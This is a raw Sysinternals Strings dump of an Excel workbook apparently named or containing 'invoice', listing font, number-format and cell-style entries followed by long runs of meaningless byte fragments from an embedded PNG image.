
Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

wolf                                                                                                         B
ThisWorkbook
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1
Calibri1*
Calibri Light1
Calibri1
Calibri
"$"#,##0;\-"$"#,##0
"$"#,##0;[Red]\-"$"#,##0
"$"#,##0.00;\-"$"#,##0.00
"$"#,##0.00;[Red]\-"$"#,##0.00
5*0
_-"$"* #,##0_-;\-"$"* #,##0_-;_-"$"* "-"_-;_-@_-
,)'
_-* #,##0_-;\-* #,##0_-;_-* "-"_-;_-@_-
=,8
_-"$"* #,##0.00_-;\-"$"* #,##0.00_-;_-"$"* "-"??_-;_-@_-
4+/
_-* #,##0.00_-;\-* #,##0.00_-;_-* "-"??_-;_-@_-
"$"#,##0_);\("$"#,##0\)
"$"#,##0_);[Red]\("$"#,##0\)
"$"#,##0.00_);\("$"#,##0.00\)
"$"#,##0.00_);[Red]\("$"#,##0.00\)
_("$"* #,##0_);_("$"* \(#,##0\);_("$"* "-"_);_(@_)
_(* #,##0_);_(* \(#,##0\);_(* "-"_);_(@_)
_("$"* #,##0.00_);_("$"* \(#,##0.00\);_("$"* "-"??_);_(@_)
_(* #,##0.00_);_(* \(#,##0.00\);_(* "-"??_);_(@_)
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  
        
        
00\);_(*
;_(@_)  
???
        
???
        
???
???
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
00\);_(*
??v
00\);_(*
;_(@_)  
        
        
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  }
00\);_(*
;_(@_)  
        
        
???
00\);_(*
;_(@_)  
???
        
???
        
???
???
00\);_(*
00\);_(*
00\);_(*
;_(@_)  
        }
00\);_(*
00\);_(*
;_(@_)  }
00\);_(*
20% - Accent1
20% - Accent1
20% - Accent2
20% - Accent2
20% - Accent3
20% - Accent3
20% - Accent4
20% - Accent4
20% - Accent5
20% - Accent5
20% - Accent6
20% - Accent6
40% - Accent1
40% - Accent1
40% - Accent2
40% - Accent2
40% - Accent3
40% - Accent3
40% - Accent4
40% - Accent4
40% - Accent5
40% - Accent5
40% - Accent6
40% - Accent6
60% - Accent1
60% - Accent1
60% - Accent2
60% - Accent2
60% - Accent3
60% - Accent3
60% - Accent4
60% - Accent4
60% - Accent5
60% - Accent5
60% - Accent6
60% - Accent6
Accent1
Accent1
Accent2
Accent2
Accent3
Accent3
Accent4
Accent4
Accent5
Accent5
Accent6
Accent6
Bad
Bad
Calculation
Calculation
Check Cell
Check Cell
???
???
???
???
Comma
Comma [0]
Currency
Currency [0]
Explanatory Text
Explanatory Text
Followed Hyperlink
Good
Good
Heading 1
Heading 1
DTj
Heading 2
Heading 2
DTj
Heading 3
Heading 3
DTj
Heading 4
Heading 4
DTj
Hyperlink
Input
Input
??v
Linked Cell
Linked Cell
Neutral
Neutral
Normal
Note
Note
Output
Output
???
???
???
???
???
Percent
Title
Title
DTj
Total
Total
Warning Text
Warning Text
TableStyleMedium2PivotStyleLight16
c1zB0vasNo
invoice
agawf23f:
KsshpqC4Mo:
Lsl23Us7a:
rstegerg3:
PNG
IHDR
sRGB
pHYs
IDATx^
=my
$m~
O EK
0M=>
]iu
T(P
T(P
T(P
T(P
T(P
T(P
+<P
T(P
T(P
T(P
G[x
T(P
e<Y
x]Q
@$b,
P^%
c`qY
=9<
T(P
ld_
xKR
 {"
!&Cb
Jw*
FE9
GJU
Q+oW(P
H]vb
^Ap
aU 
T(P
"p9
#/Y[
:*Z
T(P
tMT
xKQ
cB^bEe
7cQ
R`G
>nG
M^W
s}yJ<L)o
yT^D
rR@
zT 
K'T
\)A
*3O
Un?
?Z~d_
*/W(P
n#l1
l,^\
~V(P
b{ds
D8u
opU
D~E
T(P
/#l-K
]X|
+l6An
<Bf
T(P
)PAZ
,S{0<
V+A
r.<
v$%W
h'y%h
~+$
`?>\
`Jl
oqd
T(P
jv[*
`(=D
T__
T(P
WWW
3(B
.4v
T(P
T(P
5k}
p_[
n)KF9>7
ONX
p\QF.
R=<I
WiG(v
#aK
c/z
~$\:
+xF&v
_0u 
y>/
~pM
AQ*!
93=
ZOj,
Vi=
89(
S&8
XQ5
AkH
Fj'
3+$2
g&o
-TB
Rh^6
2yRg
{lB
"zh.
|By2^&S
=bc1UY
x]RE
$HP
/Ps
*8a
4([
?/&
3F^b
yq~
pOj!/
ozq9^
XAKk$
@sl4
{:j 
.eP
A.iY
PMO
]]]
m=b
mH\1
lUx
f+z
MSt
z>~bJ
k:b
LwO7U
iaP
'OZ
"]Up
 ) 
f6-$
Nmjj
czG}]
\444,Y
2i9
=WC(?w
:0R
/K&
k?zmSc
!ix
w.[
#}Uh
u;v
Qkll<
ah(E
[oe4
njl
]viM
{`<
`6$
q2L
9cq
<#)D
tuw}
tK5
n1u##
.#H
2C6
mT-E
R@s
Hi/
}PD
D"P
N8aB)F
@'k3
O<188
/V5
u r
E E
x>_
I`-J
_MF
D8P
r=Q
OHvf
O 8
@gp--
SN9
1"|
;\t
Zf(s
M8+5
O2k
L_P$
*7_
<p8
1,=
n@:
'-N2_
X8!
Cg)
3|+?
ap*
q_V
b)J< X
?KVp
7/A1
0;N;
4Z.
x&8
3O?
s*b
 ~\
?i*C
00N
`(N
i6CI
_g6A1.xX
Ay<
J{-
d6Q>
M(3
>:3
-M49
[%_
LPXC15
"]f
0$(
a_$
H^!X
Mja
<vSo,
A[)_
+!As
Yq<
]DC
+_c
( B1;~
E$*
P D
kXW5
bBpT>
L3n
|D}}
oCF
,i|++Z
{D&m
rqhg
0yr
+s;%p1!S
NCS(*
:Q0
%IL*
ouY
UJ`
Tlj
@~@
ZXR)
`90
;Z)
:_i
6%S
0#r
<%|
pc614p
!:C
I'jk
d2w
fkD(\"W
-f;
d\X;v
]#+
UHX
~4FZ
A4)P"
,G,
=I{
A9@
@0=
ax4
lOT
OuD
SGX
W /=^
P2{
LFfG
Q$P
vjt4
B7 Z
.F&
A`AW
1u$
oA@o
u2R
}3$@%
!oa
`9F
c."*
@QV
QVK
#c^l
RS[C`=6ll
o}7u!+
<VP
~f5h
:O:?
Y YD)
3F4
vnL
[}|
t1~
Oj'
3+P
Mh8$
D+j
abG
LH1
.8@
]S#
bag]
a5o
{EH4Q
cqD<2
RbM
DOk
!Lp?
[&1
B1@
-a;
HeP
d#R
x?Q.
H\r
VM0
24(n
`+^
Rsx
C8A
cD9
+^)z
 b6
NiXX
$=%akq8
7l$
bB1
o'aQ
'q(`
."J
AW@
R5)
WM.<zc
HS-Q
tD.
J%.
DN0.
24JE
1Xt
})*
G\I@dx
25 
e(l
 4?
?e<
A[{
%{em
jAig
d1-
70s`
#y&i
W^C
6@^^$
0>nP
w="
>8h
>YlX]
)H"N
eI}
/rB-
6aNl
'.ZFKq>
f'$
[ 7
*I 
&!%T
pLpX
L8A
=lIv
8TU
X(,
PT_o/
`p 
3n|
hZz<
`$1
];Q
H$R
rXUO>
LEI
wen
Y-*H1"7
-_F
cW"j
Y4.r
;7I*
aRl
eDi
=| 
P#e
yFA
r-v
$B%
F|8
cC.
]4s
"rS
F5R
C.f
!^bQ
SHqb
px!F
aBb0
y?4^
8GH
;o.
n8X
ghp'b
ysP
! 4
p,\
.J?
`|{^
Uzq
b$k
{\%
M.L_
~sj&
y$a
-,Bl
pCSV
/r,P
K,{
(Q$=
YL_
IU/,E
V(t`j
778ST
MMa
_}9
AAj
o4442
^UK
d^&
tioq
ox@
!HYzX
.`k,I
s(T
4qx
W_WW
#w2
vdb
1d(b
CcA5~
WA]"H7
S$*
z,8:
R`w>
ec7
VzWh
O8q
9_RD
BM*
*!Z
c) 7
V|0
W7! C
[och
=8><m=
TUh
4"r
iUy
lnD
'w=
$H~
>ew
IH%
gW%
4(a
1l*
rOh
Bn~
2Tc]m-
JVG
c)n
8GM
Np &
a'b
{Kk
Zl:D
*@O
d.&
\p<
#+y
5q,
<dn
Jvl
~=,\
)A5r
\+qf
kkk
XV1F
Xp8
YW'|78@
q](A
[7>
}DuU.
q?< 
PEL
1$I
r288
H<J
aZF
#0$l
Eya
~:6
5OFz
'LH
}%U
u3wXP1O
< <
.7i
E"O
Ttr
eQ4
EJ0
)D.#
<BBM
o_'
SG-Z|4
%mm
$>$
;sZ
qV1
l9<
1\:
TP2/
Jf^`
BFG?
PZ>
DEO
7O)S/R 
NsK3
z}c
_vK
<(Ym
/\{
CpY(
.e,
ox@_
vQ]_
VEbU
"i,
0%]
cr{
&R>
H6y4#
cBi
xP'
qT#{
V>>^Q
@pM#
C2T
0?"
7Ls
5;}
e>1o$f
'QP
h#J
w}xYZ
}%cyYk
`*}
0aW8N
(+j<
O4]
\#R
FSR_y
#1x
<Nc
A*l
,|3
/TE
K=-
`~I
Xb1M>
Hbz
=W\
<5z;L
)V=
6HT
3=&\
T@<
=#6
o~C
:%d
8N(
q8i
,se
'Us
l$.
]&!5
x58
O}5!
W>l
f j
c.g
Ba4
l<44
\6S
YoP}
KVt7
cfu7e
#\n}!*SEI
uZeN
B"@
 3=7
iof
](#
P;}!
CB!B
:cJ'
<ej
]Wo
ijq
za)?R*_
@jL
Fqr
CTY0=Q7
K2u
IMy?X
HZ*
T'C
xQ%
Q{X
*By
iFC
frC
ko(
l_U4
|8V
2LS
`:_8
{I] 
P~x
$2bz
D](rC
Gr)
}-`A
~u1V'
7F,
S/P
x08
{+A
y]f
M2|
?.,
;nJ7
[%"
YNbP
*rw
2&W3
ZL9
h!\
*% 
 }y
o&@
lv]}
kYmM{0K
SRz~p#8m
yq#
<yuL
Ni1
F_K}
@I+'Al
xQX
jTg5(
\{X
{;[A
YY`
6(1
n2X
PTp
`5T
+4d!
NHFM
b&e8
p|B
*"y
JBC
S4(6
Zhp
oHg@6c
NNFr
R}A
(|;8
w~,(A4
a~I9
F{$
#EKP}
55v"
A)\h
?==5
d+E
J3%
h1+
eh;
BaT
pdK-W
V)@
Aoo
N--
'!_!
~xx*s
hD 
o)_
@4U
JFU
wpL
k]d?
Ft,X
`eBf
`$P>
vvR
(9(
1*I
*Ap
&9#
6CO(jt
SF^
eR;
a6r
Uvbx
B 5Z1X
D:K
>T_v
s!2
SUEb3
h|+
B%!%
tfhzh
IHZ
@X{
T31
FH*o
>mp
DH~_
DUdZ[
0v{w
KGm
zJk
0pz
$"!
j)P
#/A
gE#M)
#xm
R^6Y
<&"
^p!
\Q^5zp
'MO)
516
{L-
@7>
L>G
xC(
KdW
h"C
acb
# `'e
 6q
[X(
kn+q
c*m
,BL
*{C4
Y0DG
2qe
lM6
JFr}{
W^xlK
[?O2
1_A:7
rlM
s@>
k_&
.S3"
#.e
:.d
g<Ip
@|B
R"E
_rq
1Nv
]^G
bIl
3Am
1}:
a1&
6^k
XW9
TM/<
\@~
6NB
tS-
<?k
Bn4
L?M
KqC
x1h
 ,QuE
&#V
xS>
Du<
>bJ
*f]
[0:B(~$
X":
!oO
uvLK~
Uh9
g7=
5XW
Mmc
0](
u.8
^(%
Z^&
]&8
)EBl
*HN9^dt
7[M
{!m
xM*%0'j
O45;
P[SDo
OUWY2r
6lX#QE
]f*A"
JeV
cAB
H'}
$A1:
.cxc
&9:
OB^^
@1.
<OL
z4y
.=eK
~E;
aK+
@rL
L_G
ph__
gu4
sNZ
m4>
ui}s
:-A
Uo?
%-YP
NT(
pa|
Z$0-`0&
q^*I
0hK
Jaz!
EP=
D|5LC
{1^
y!3
=cx
KCTT
^;~
|\4
jSe+
?V6Ou
oEO?
Rgi
Xp=
_Cw
7SU5-
Huk
h>2
0Ba
g._2-
q#p
M]Z
/jE
_~d
$U!
36w
bl&p
QEzL
2;B);
i=W
4U!
7%4&
MFuP$U
+R{
BCC
9g%
lzM
tU2I
Oad8W
Tbv
iGO
pm2
sW<
3{VM
jkM
W]y
fjjc'
`v{
KPi
,Y8c
-Dl
T%-
bGg
Hh[
'Q9
YZVv{
?v<
jQT
jd~
]~C5
"55
Ms)#
vK\
 |,x
U\L
E4s
b',
T?}r,
9I~F$I
,|[
A/1-
=Kx939
qbW
I%5CM
/_/
@1\
Gn%
znO4
PCm
;ZfLo`
P*Y
mHdO^9
3O\~
3N=nF]
"Xn
]4gz
qh[}m
#X!?
Y0}
j"M
jb;,A/
?%\
q#Y
%(0
Z2!O.
466
*wW
4bjv
M$q=r
EUA
XTW|
{U&=
)#TqXM
2%1o
HUt
Yan8
cLw6
%Ga1
kCq
HQj
#P4
tu2
"Al
:2Z2
l`r
||M
~*.
d03,
D8}4
,I4g
;fvc
igLA`
o(h
u@3P
YMe
6uv
lbl
/^t
?yj
7lDW!}
M_)!
:tYR
<6&
 <+
J_h
kc*
]m%
)F%
D\wLK
2 I
C;^
Rk7
HWg6
zl$
15T
Kc.
s}+f5]z
6'9
<#Z
0mY&
ruq
y<eY'~
8?a
mG%0
\Ku
g.0
(P:_.7
bE4
LHy{
tRT
CPB
zl<
"cpj
!LS<
W.!26
YZ0
2:H
'(y
_>fe*Z[
n-ff
fr[
9*&r
cd-
-:A
s>\
A)#
9<e
@y 8Q:(
^mo
q|#[c
{Q68s
0@2lZEU
YKrP
tS`
PiE
KT.
^TTXi
{ep?HI
}/&f
|t\
%Vq
`$rp
is_b
s8l(=
Xu2
OOi
YA8a
*34
\Ks
;9b
hn0
p=1F
IV[
df+
|pi
{M<&
f51Y:
 zF
[zSs
5r8
i464
v^z
)j.
>4U
LhG8)7
!8GP
]bH
x:}
!|/
/~lS
==S
,.~
iBr
VnT(
h"30
$3D
"k7
r0*
R:g
+{a
XB9N
R]Jv
-Wr
):K
l"qs
y&d<m
@[B
qSJ
G=V
xm)
bS3
gLT
y_g"E
Ls*
bo}
Fen
MTW
qlKn
I`7I
fw)
GI"
Q$>
4r|
EZIA
}$:a
""+
dg5
B+{q
]=V}`av%
I/tn
-bb
34q|i
.(|
B8"
1AS
sc%
8HB
`qs
t[;
-<$dH
d>:
!XC
Zph
.k;v
zr]
oAjW
Oan
TM}Ooz
'(?
Wjm
:{R
@ObM
_W[G
O$7
)Z"
kO)2
<81
fEX
6!m&
246
8mA?
%n2
!|l
y~)
cd;Tid0
MjN
KZf
;/=kZk(
ymmS
P]C]MSm
icw
`$^
nBzF
Q07
cwl
c`h
b)-`z
EOrF
VHN
fY4do&
 V)
l1o
$i,vZ
"K<
N{8
\^+{
~w1
%yw
|d7
2vFS
O6T`
e$3
KR$
j)*
K!c
%cr~;
[!_0
c>]i"
qD0F
I8,
xII.
opd
`<4D:
.>i
|"L
'V=
Xb0
[Y_
5$G
v+y+
a@s4
-[vg
3k7
jC3
}]C
F]r
uYy*}
T]y
h!<
0w`7
>Zv
675
y_kk
E<=
qK}
\:t
2H1
Vkv
7\?
H.d
lh14
#1#
BSD>
pifl
bQn
RcD
-L=!;
9Nq
a^H
h\{
x>z
nZSy
1N?
E8+9
Me'
E"Wa
i>e
07&F
,6c]
k6v
|t|S}
EikN,
"h3
o&2
roo
c"]
y4e
df,
&6K
f,@
g3;
;{6
/\y
Bl`E
q4T!
$~f
&b^8(up(
xf8Kt
7l=
ymK
'1a
El.
''&
]&1
LeCtH
vd{
wVa
+S,
3$km2
aW=
D97
+CFy
AV0
<e)
6ri
=~sg
9+&
7d0
p||
YNSu
IFj4
coSA
D^A;
6kM
oMZ
-0y
al2
+d2
x4J
y6*2
R`P
Y"h
$kM}k$
pes
"<][
)Ks
[[w
~hSm
lUlh8]M
gO]"
:%=
`K4
;\IhCv
=[@
?I"Y
M](
g>Ki
;fx
`1&nI4
1Yl1e9{
dq5
0[,
*Vp
hVx
e@g4_M
3j}
F,^
\4I
t53(
6FA
y-F
+b!g;
pSD
Wq8
r:I*
f|GX
/c9\
}q8m
tK,D
/?8
0QP
T.^W
@6N.J
d,J,
N`U6
P5kquU
g,"
+gN
p$N
Cw=
~0\
?uJ
$7<B
|6D`
!vp
w_qb[s
cYB
@y2Eb
 ul
q#[f
ceu
JK&
s[6oYy
I%j
F8g
bx\
7V7g!
TMd
T;uJ
Dr=
oo&
Mk[
`fS
V+,
P0L,\h
fLmE-w
xkc
$E^q
SCC
e`+V
e#I
!2(lGU[
'nWe
pjkU
c_p
S0r02l
~CC
jni
8LB
rmM
$G*?
kOf
jfG
X5eJ
jb={
ln{
Dc0
ESN=y
PKs-?
JDo
%cb}
z;t
H("e
n;n
2#Y
FFcX?
q',u=
pg8
hM~8
Xx1
wxx
;tdQGfr
R5X
IPCr
7A2
VyP5
vAJ{
t,Qo
[n;
6.\
Yzmxm
1pd
93Z
oYu
HGb
SO=~^K3v
w^~
]{vw
aHDg
sfq
gO7V
ek[[R
)$G
7IZ
jwgwWWO:3
"&3
nAw
fj"
TGs
/^=
xz[<
`J[[
|`uo
Fbl
loob
mMf
Ckk
bv(
gNO
Dn8
XU5:<D
2Uy
^NW
SNXx
Hf0V
h6?
w\~
.hi
hn(
Z[kjS
'1B
bFs
NZ~
.\c
EQ&
y"p
e+E
*:N
flK&i
{``8
f6x`3
>R[m]
9@Z
91H+
H8?
fs{u}?Uo
immM
6,^:
PMu#G
va2
Ewd
}O&
l!U
\sEr(\8
m{vw
9mB
4JD"
|8^U
mTH
3N?fjK"
]x]F
pic
fq>
c`z
e8_
[8wNk3(Z[v
igOf
,*D
R E4q
llv
M2I>
mr1
D:=4{
y3[
&>kzk26
Rm-
h\y
W._
Rc1
xud
SNZ|
`ow/
g$a>
q Z
Ip<
zCC=
}~o
]Ev
Ij[
!jX]
<eJ54
`vt
DP+
aWo
-mf
s2BC
2YBN
i=@
P]u
@o,
LZp
H,2
cj]
bgo
BCC
55`
kOmCskS
"z$[[
mjdP
SS'
Pmvpt
`$.457
w`0
LuM
hMbtz[
M"0
;wg
d2UE\
H4TW
"+V,
}O<
:V,
(tt
T2^
fdkb
>G+
$!7
L{F
F" %
>|k!
:hhi
A66r
nQ3
bpp4=
z{,
:Cb
Ffo7.
f@{
ZdcJ
tAm.q
!c8
W1<(
G7?
@67
g.NFH
LI56U
9-o
\Gr
tJS
[]G
@Ws
gMkr
N9n
;/?
@h2
g;qw
/?J
ht(
djN{
nY}
wt8
LkH|
]2stx
82<80
G?{`
`_v
]F$
zOn8
Wf4
FtX
j/8{
.kk
Gbs!
lknX
=)Q=
WNo
/?\
uw]w
EM5a
>&I
Onzh
llN
gMk
HMu,:{j
Y'S;{
:TSe
eK[f
hkS
8mj
B\"
gNk
E^D,
$XY!
uPnu
b#Q@
`d8
ORK 8
g6m
p.3o~
e~|
E }uU
KN?
9\D4
rCl
hkA
rV=A
'Vo\
"Gf
/l?v
3NY
;svsC
zj[
b}=
]xt
KO=~
C\=
yxq
vJ`
6<3
|n0
QWS
8\0
k(LB
:4T
Bvg
;/?
Yq;
2[9,
pX\
c14
vRb
Nt;
1^p\8
P(_7
U9 f
PIXI
>Q.
P[[
3PSS
w^q
=]}
Fsf
{;S
|]2
ez{
e`0
-A;P
7wZ
Kg-_
[L%
jV{
5W]z
.>n
6m*G
tv5
ZhX
\s]
HlgP
Z30
kCW
SR5n
*}y
q#-
T"Bh
Kmj
O\v
1W_v
cIb
L4ZN
mo^
y_w
DM<9
vvG
Ul9
I4,a-
koI|
T"?
HuU<<wF
jW.^o
^j{<@TA
L)]
Jvz
B'y
.f5
MrG
:&p
*)#/
U>H
|ab
M#9m
OOP;
<[]
j:B
XWwp
4gZ
O>n^sC
tN[(Y
Y3b
sWG
[a8
/\=
!ONu
|>h
:wN
]ug
&^X
k.z
W^r
Xtg
4L8?{
wNa
a@9y
vv-
N]z
pFh
U9HH|8
W"y
pU(_
b"1S
bW^z
rxH
%w>
la`
Pkk
OdU(
f7zhJ]
cC*
\n&*-
%|c
9bl
wY 
T4W
zaIj
04qdq
DF9D
vvp
muv
`br;
)yl0x
J!J9_
%~N
(Jb
355
_8}
6&%
TQ=
8=gC^m
~9z
jKK
AVg
+Qj-
THN
/b,
XT`I
o**
P<)
8-Y%
kJa
?B3/u
0R,"#
atfq
`Pi
|-R
`~j
hTc3
)<4
^iE
`Rc
'U_BL
RY[
xXif
!)Pd
W$F
t.NI^O
i^I
@vaV}
4FN
&Sgk~[s
Gh"S
V }$
;]R
^]S
Cgn
(JJ9
)/R
hVS0
Fx+
j.$lX.
QJv
IE_@
klj
4WT
rLR
.jJ
+f*
7E /1
S."
t\8y
C\!Fe
BJ&
Fz"2D
B}E
(:2
/x|(
SQ2
xx4
4ad
S(;
J1Y[[QQ^
>/:
t3*
S-+&"
7xk./
TQ`iEh
io[<
  [
85df
X0+
#I`
ll)
aE=
$TO
#`NY
PRu'LGh
KSy
DPjD
1tdr
9&<(o 
)(P
b**
Eq{
#c K/
+gYPP
:aC{]ccq,
d*'
&`p
JtHE
qkg
[tb13
^}o
{_>x
Lm@<
MJ5
PUU
b>#
vRO9
-(+F
}m]}Q 
/?qf
@U`
P)\
>A=
DtyT
$}/I
QFU`!
B;y
Kh!Q=
aOM
KV9
["g
BOTs
rXAC
BcT
HxV(
RA8
YDQ
_;}
k-B
h28
rxC
$.:
+UZ
;?8
j$Z89S
ks+
rq'
@qQ
aG122?1
t!$4S 
/p-
xs8
>32>
>J[8
XO!
ZKvC
f?$
#O%
~NF
0?:
>pZ
8$ 
0jX
lrX8Is%
U,W
&@Dq
IqzB
7031
AO8^
8;a
nki
8gr
$Ta:
UtC`
bGA
PzgO
R#e~<
I[:s
Ic4
tE,
s?x
+o]X
F!1
@+;
.L=cI
.Yd%
IWH
,+/{
!vv
ow=;
R,+
xG|
rt@
F6Q
sHM
87Ik
@6x
@u 
xT-O
TZ-
g^9t
g_;~
F3K
.8I
DW@
_iP!,
U6}
dPP
JJ{
ht$
BY\
tyf=
#1D[
Bkwx
s2m;
4\#|bg
6oi
E[\`.
q` 
uBB
mj/7`s
8Q^
57U
*ZH
(ed
c5s
H0C
F=:
,E40>
)R<i
\3)
nJG!
vW`t
a~s
=n8
b@"
 q8
t!)4D
0!Q"9S6
{bC
\uT
hK 
\-7
f[g]
[O.
x*O
rgK
>~D
"Z1
i~|
MO=
R%/
&'y
y's
k|f
H_C
&xY|:
jFG
MmE
jH!6
By)J
-u%E:
'~=
ULa
xdBA
v_|xb
p@+
s!@
0{%NK
pN2,
r8<A
QS-9
5kK
]SG`
O P
004
!Q@z
L2m
Q,H
RJo
6T}
)/Wm
Zkk
@h|
J6'
BCr
:N4a
s^$
yjha
/am
rCk
sO4
<u`
[+L
RV^d
=1m
L%pw
<L(Q
tIh
"<6hlf
I"T
P_)<
w:},
\(~
E;6
h?eeyO>
N49
L[kcuQ
\]C
Pb6
)[9
J8v
GQ>
+Ow|
M_zr
;o*
o?I
gll
_|q
`03
ymd
`eGZi
bQo
#h2
':2
LD}
$H2
(VJ
F2}
G<Q
<fP
+p4O
BE+
XWYbNF\
[oUY
%Wm
+QEI
s,5e%
X*1
BBE
bv{
#Q:O~
y+@
P{ut
IDATRE)
o@Z
k3F
M&4
YPy
EYp
$G.
2:H
K_B
fPq
yh4
LP,
ikk
ukEE
P#L}TD
Md!b
I1)Cn
ts%
p}dn
St4
1k*K
F3,
@ea
e9X
/PBqT
$EX
ksx
ML{_=x
z=*
[k^[
+-575
(u#(C
JY*?
?}}p|
ZYn
z5*9J
JHU
AG[
VTE
~{ 
MDP
N(t(
fyx/
}CX
"=R1
i0iS
S]7F)
gzN
)4j
"Y.
?~}|b
j\Q
,8#
J% 
zN{
W(t
1gB
h,+
{fcrM
djG
i(.G
sgT>
:qyr
v|l
`('
;:o
#5g
wNt
BHP
r|1
800<
{oGM
z^I
k~n 
QyT
L5OS
JYb
dF7
F`z$
:jsC\H
!Z9
G.~
'G._Cq3
F#^
_SY$"
3#74
rD$
ePRPD
[U[:
-:zv
VKD
J? 
WZ\
hYT
nj6p
aT>fY
sB#
Jk}]>
GN^
pc0
696
<2i
ha%
h"~
DY^a>
krzqz
vD&
Bln27
?9=ew:a
nm_
8<n
K )8
Nw8
]3W
 koP
tmhl
}ll
1:975
TH"
Ev?
F,*46
,:<33
:H"
,)?
ohzt
VXuY
-2"3
I ]
\\p
4CO
bhd
ik[
Syc
ox|
a$5r
mdd
kJ:
;oC
,,x
RTRf0
<E4
MeF
jJO
]g0
<?p
wkUE
Sh%(7
b&44
w,Jo
-+~
*E ,
4??
%o;
8su
qOS}
:&eA
/)A
_`E
C3>
"{ 
6U>
lxt
{k{
G=j
gw!
8:2
WTW[
51{5
h4MM
5nG
Pik
X(f3
/v#S
)~~
;2=0
'/_
,,@D
;ew
>{`
xqb
J9=9
 r;
187
'O\
#&V
7004
AN 
;72:
N24
NM^
1=8
Mmk
|dKS}
]z)9i
eee
;v>
((,
3,@
~lG=r
"%d
PRXX\
H5zpf[
N/,
|a$2
"7 
QP3
jt@
x1$
[_Y
`0(
UG{
hTJQ
0iO
BMU>R
nX[
Fi2
jUJ8
JJJtF
"w:
Mt#h}
mS[i
7DJ
SZmr
 N=J
'VR
SOD
ag%
%a-0
49.
kjb
D,Q
"Ng(
5UT
c w
Q0_
;<>
Vkq
-+2!G
k{[kc
#PY
:1^
sbp
04R
|"R
F1ZZ
{KkM
>pT
!0%+OD
)--6
O.w
d"J
FUi
#q"*
8P[e
{;7
 b"
D`e
`8$
?)[
Xr-f
~MQ}U
%@$G
^QXj,FB>
 $,
ySH
&BN
344
NQRR
oR%K
gkk[
4+J
$|9
kKMd
d_!
jaE
J]l57
4;:
(Wo
QBMD>
{kS>
> \
8<6{
`RiL
33S
M:]Q
ZtF
NY2
S<:
-C*
&j>
4^j
l`Q#
c)*
SyQn
348
zDH
L04
>>>
T(a>/*6
6Grhlndlqn
6gll
&pv
R-Z
lmi
08,^
wz|
@Voh
Iw0
vo[WYN4^
#A)_X
&)&
i+uJ
pO 
\IH
Nl 
@6_
xK6~
9'<
@A-(
rJC
,#$
TYYfB
PVR
HQV_
ow[
7ol,-
uh6K<
=Ip
O0?
Jee
-?{e
4qP
#I`
$@/M
nx/
Oeoo
~z q|(
t(V
(_!.g
`MW
(a%C
#IcbQ
aTb
o=1
RpH
&?q
D&Md
A`v
b*XQ
dn$ 
Z]D
,KP
dLL1
`jE#
>1B
%MF*W
(OK
18JhM!y
x"*
~),5&v
@rzz&
1@L
;O0
^Fyt 4
)0&F
BJh
lKHY
A4"X
{,=
LH@
)6S
q:Q
efqT
ic'
c#=
/G`n
#^0
@D*
2MI
ao&
[`2
Ak(
;2b#
@-U
jOI]h
E5d
,AtJgO
WbJ@
 D}a
?MG
a2$E
/%5
G9X
vhs
&$H3
8m5d
F }
4Ap
lf$
.Oe
r8C
pTDY
1J 
fA@=
29*r1
\sV
bAS
0cA
q9.I
,O%
2:d
Ocz6
LT"44
@"!r}
2[#1
2 "
`0h
rs6
i`C
&+R
f+B}
9]-S
qdpA&
'!B
(yzP
)I+
t>*B
,J7{
pI0!
$@/M
i M
:ekdF8:
!T)
E 8
)hN=c
D&y~
4"*
TfV
%#}
IOFC2
S!$9
53D3<
52Er"#o
P)$
j#)
Q$6j
ZI:
zi8
lz5
LGd:
1WSzPJ
2'r
Q4O
AOfc
`ia
7FI
&J)H
`[FEE
s1H
4!$
|z%
Q`m
DpRq
Rd,
KWS
gw4#w
RKx
cUB
`QF
aiL
v~g
foY1\
og:_
4-5nSN
g2e
_fGU
-k>c
Y&|
7rO
J#M
'{|jKacN
$ I`uI 
LF9
uAJLi]
.AS
f~ZP
Zf8V.
Iuf
RE.
^/]
$!`Mq
E@]b
t\&
py07
#}Hs
ap@
Mfw
8)e
M}7
^*q!
{2J
ic6k"
\E!-
%f4
EdI
u3<7
)9+
L=/{
9Bf
z>_)
CX;
xj6
O%?H+HH
J=:
ep$
(ya
9BZ
VNd
i+w
q{*|9
TJc
%qAI
eXlI
Bri
zE;I
bwefH
%4O
5D"
BZ|
&ir
3m[
l!,
1)Q0
fiz~
&o'
,I2#F
Ionsz
l:;
$p7
[u$
Qv=
]z)kG
]RW2?
4==C
Yp9#
El\(
+VMz^q
2s7]
ECH
|K!
r[9
yw}
Jo5~
&{L
.st
<9W
-95
L3v3%DJ
]zh
KWd
J-\
1~Wf
RRF
HK$
ge"
Be]
i#r
o-k>
Vt=
m!}
-}$
RK$
nk 
=]}
rOO}`
:jO
},W
(uA
m^&CUT
AdC
I7J
$ I@
;h6q
(I@
$@/
)7`
$ I
#I@
$ I
G\z
#vA
X=U{
$ Y
$ I@
U>c
!I@
$ I@
DnY}sAj
GEj
"] I@
$ I@
1?|
|KY
^%m
<M$
$pK
  l8
$ I
